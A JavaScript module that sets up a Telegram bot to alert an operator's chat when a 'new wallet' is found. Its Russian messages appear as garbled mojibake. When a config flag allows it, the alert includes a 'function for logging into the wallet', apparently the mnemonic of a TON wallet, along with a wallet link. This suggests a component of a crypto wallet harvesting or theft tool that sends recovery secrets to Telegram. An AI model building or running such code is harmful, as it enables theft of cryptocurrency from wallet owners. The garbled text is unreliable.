import { Telegraf, Markup } from 'telegraf'
import { shortAddress } from './utils.js'
import telegramConfig from '../config/tg.js'

const { botToken, chatId, showMnemonicFunction } = telegramConfig

let bot = null
let messageParams = { parse_mode: 'MarkdownV2', reply_markup: {} }

if (botToken) {
  bot = new Telegraf(botToken)

  bot.start((ctx) => {
    const chatId = ctx.update.message.chat.id
    const messageText = `ID —Ç–≤–æ–µ–≥–æ —á–∞—Ç–∞:\n\n\`${chatId}\`\n\n–í—Å—Ç–∞–≤—å –µ–≥–æ –≤ _config/tg.js_`

    ctx.reply('üëã')
    setTimeout(() => ctx.reply(messageText, messageParams), 700)
  })

  bot.launch()
}

async function notify(walletAddress, mnemonicFunction) {
  if (!botToken || !chatId) {
    return console.log('–£–∫–∞–∂–∏ botToken –∏ chatId –≤ config/tg.js')
  }

  let messageText = `üí° *–ù–∞–π–¥–µ–Ω –Ω–æ–≤—ã–π –∫–æ—à–µ–ª—ë–∫:*\n\n\`${shortAddress(walletAddress)}\``

  if (showMnemonicFunction) {
    messageText += `\n\nüéØ *–§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—Ö–æ–¥–∞ –≤ –∫–æ—à–µ–ª—ë–∫:*\n\n\`${mnemonicFunction}\``
    messageParams.reply_markup.inline_keyboard = [[Markup.button.url('üíé –û—Ç–∫—Ä—ã—Ç—å TonWallet', 'https://wallet.ton.org')]]
  }

  await bot.telegram.sendMessage(chatId, messageText, messageParams)
}

export default notify